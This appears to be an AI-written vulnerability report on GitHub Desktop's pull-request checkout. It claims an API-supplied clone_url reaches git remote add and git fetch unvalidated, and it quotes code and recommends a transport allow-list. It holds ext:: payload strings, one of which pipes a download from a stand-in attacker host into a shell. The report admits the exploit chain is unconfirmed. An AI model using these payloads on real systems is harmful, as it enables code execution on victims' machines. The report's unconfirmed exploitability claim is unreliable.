## Analysis

The seed report's broken invariant is: **a value that should only ever be a "destination for funds/spend" is instead trusted from a source the (semi-)privileged actor controls, and used directly without validating that it's safe.**

The closest unprivileged analog in GitHub Desktop is not the admin-controlled `update_config`/`spend` pattern (that requires trusting the app's own privileged operator, which is out of scope here). Instead, the same *"trust an externally-supplied destination string and use it directly"* pattern appears where GitHub Desktop takes a **GitHub API pull-request object's `head.repo.clone_url`** and feeds it straight into `git remote add` / `git fetch` with no scheme validation.

### Finding Description

`app/src/ui/dispatcher/dispatcher.ts` → `openPullRequestFromUrl` reads `pullRequest.head.repo.clone_url` from the API response and passes it, unvalidated, into `_checkoutPullRequest`: [1](#0-0) 

`app-store.ts` `_checkoutPullRequest` forwards this string as `headCloneUrl` to `_findPullRequestBranch`: [2](#0-1) 

`_findPullRequestBranch` then calls `addRemote(repository, forkRemoteName, headCloneUrl)` when no existing remote matches the URL, and subsequently fetches it: [3](#0-2) 

At no point is `headCloneUrl` validated to be an `https://` or `ssh://` URL pointing at a real git host. Git itself supports "remote helper" transports such as `ext::` (and `fd::`) which, when passed to `git remote add`/`git fetch`, execute an arbitrary shell command specified in the URL (e.g. `ext::sh -c "curl attacker.example|sh"`). The existing guard in `app/src/lib/git/clone.ts` (`isClonePathSensitive`) only protects the *destination path* for the top-level clone flow — it does not apply to `addRemote`/fetch used for PR-fork checkout, and no equivalent scheme allowlist exists in that code path.

The same `dispatcher.ts` file demonstrates the project *is* aware of untrusted-input hardening for adjacent flows — e.g. `openRepositoryFromUrl` explicitly rejects absolute `filepath` values and calls `resolveWithin` to stop path traversal: [4](#0-3) 

That defensive pattern was not applied to the `clone_url`/`headCloneUrl` value flowing into `addRemote`, which is the actual gap.

### Impact Explanation

If a GitHub API response for a pull request's head repository can be influenced by an attacker — e.g. the user has added an Enterprise Server account and that GHES instance (or a network path/proxy terminating TLS to it) returns a crafted `clone_url` for a PR — Desktop will call `git remote add`/`git fetch` with that value. A `clone_url` of the form `ext::sh -c "<command>"` causes local command execution as the Desktop user when the app fetches to display/checkout the PR, entirely without any git-provider-side privilege — the only actor involved is the "GitHub API object" surface explicitly called out as in-scope.

### Likelihood Explanation

This requires the "Open PR from Desktop"/pull-request-list checkout flow to process a PR whose `head.repo.clone_url` is attacker-influenced. This is realistic against a malicious or compromised GitHub Enterprise Server the user has signed into, or a network path capable of tampering with that specific API response (the report's allowed "git remote/proxy response" vector). It does not require local access, admin rights, or prior malware — only that the victim views/opens a PR served by a hostile API endpoint.

### Recommendation

Before calling `addRemote`/`fetch` with any repo-supplied clone URL (`headCloneUrl`, `parent.cloneURL`, etc.), validate that the URL uses an allow-listed transport (`https:`, `http:`, `ssh:`, `git:`) and reject anything else (in particular `ext::`, `fd::`, or any string starting with a flag-like `-`/containing `::`). Apply the same allow-list at every call site that forwards API-derived clone URLs into git subprocess invocation (`addUpstreamRemoteIfNeeded`, `_findPullRequestBranch`, clone-repository flows), mirroring the existing defensive pattern used for `filepath`/`resolveWithin` in `openRepositoryFromUrl`.

### Proof of Concept

1. Attacker controls (or MITMs) a GitHub Enterprise Server endpoint the victim has signed into in Desktop.
2. Victim opens a PR notification/URL that Desktop resolves via `openPullRequestFromUrl`.
3. The API response for that PR's `head.repo` sets `clone_url` to: `ext::sh -c "touch /tmp/pwned"` (or equivalent Windows command via `ext::cmd /c ...`).
4. `_findPullRequestBranch` finds no matching existing remote and calls `addRemote(repository, forkRemoteName, "ext::sh -c \"touch /tmp/pwned\"")`, then `_fetchRemote` triggers `git fetch`, which git's `ext::` transport executes as a subprocess — resulting in code execution on the victim's machine.

Note: I could not directly inspect `app/src/lib/git/remote.ts`'s `addRemote` implementation (tool budget exhausted) to confirm whether it appends a `--` argument separator before the URL, as `clone.ts` does. If it does, direct flag-injection via a leading `-` would be blocked, but that would **not** prevent the `ext::`/`fd::` remote-helper transport abuse described above, since those are legitimate transport URL forms, not flag injection, and are unaffected by a `--` separator. This should be confirmed by a Devin session with full file access before treating the exploit chain as fully proven end-to-end.

### Citations

**File:** app/src/ui/dispatcher/dispatcher.ts (L1957-1972)
```typescript
    if (filepath !== null) {
      if (isAbsolute(filepath)) {
        log.error(`Refusing to open absolute path: ${filepath}`)
        return
      }

      const resolved = await resolveWithin(repository.path, filepath)

      if (resolved !== null) {
        shell.showItemInFolder(resolved)
      } else {
        log.error(
          `Prevented attempt to open path outside of the repository root: ${filepath}`
        )
      }
    }
```

**File:** app/src/ui/dispatcher/dispatcher.ts (L2039-2045)
```typescript
    await this.appStore._checkoutPullRequest(
      repository,
      pullRequest.number,
      pullRequest.head.repo.owner.login,
      pullRequest.head.repo.clone_url,
      pullRequest.head.ref
    )
```

**File:** app/src/lib/stores/app-store.ts (L8613-8631)
```typescript
  public async _checkoutPullRequest(
    repository: RepositoryWithGitHubRepository,
    prNumber: number,
    headRepoOwner: string,
    headCloneUrl: string,
    headRefName: string
  ): Promise<void> {
    const prBranch = await this._findPullRequestBranch(
      repository,
      prNumber,
      headRepoOwner,
      headCloneUrl,
      headRefName
    )
    if (prBranch !== undefined) {
      await this._checkoutBranch(repository, prBranch)
      this.statsStore.increment('prBranchCheckouts')
    }
  }
```

**File:** app/src/lib/stores/app-store.ts (L8640-8691)
```typescript
    const gitStore = this.gitStoreCache.get(repository)
    const remotes = await getRemotes(repository)

    // Find an existing remote (regardless if set up by us or outside of
    // Desktop).
    let remote = remotes.find(r => urlMatchesRemote(headCloneUrl, r))

    // If we can't find one we'll create a Desktop fork remote.
    if (remote === undefined) {
      try {
        const forkRemoteName = forkPullRequestRemoteName(headRepoOwner)
        remote = await addRemote(repository, forkRemoteName, headCloneUrl)
      } catch (e) {
        this.emitError(
          new Error(
            `Couldn't find PR branch, adding remote failed: ${e.message}`
          )
        )
        return
      }
    }

    const remoteRef = `${remote.name}/${headRefName}`

    // Start by trying to find a local branch that is tracking the remote ref.
    let existingBranch = gitStore.allBranches.find(
      x => x.type === BranchType.Local && x.upstream === remoteRef
    )

    // If we found one, let's check it out and get out of here, quick
    if (existingBranch !== undefined) {
      return existingBranch
    }

    const findRemoteBranch = (name: string) =>
      gitStore.allBranches.find(
        x => x.type === BranchType.Remote && x.name === name
      )

    // No such luck, let's see if we can at least find the remote branch then
    existingBranch = findRemoteBranch(remoteRef)

    // It's quite possible that the PR was created after our last fetch of the
    // remote so let's fetch it and then try again.
    if (existingBranch === undefined) {
      try {
        await this._fetchRemote(repository, remote, FetchType.UserInitiatedTask)
        existingBranch = findRemoteBranch(remoteRef)
      } catch (e) {
        log.error(`Failed fetching remote ${remote?.name}`, e)
      }
    }
```
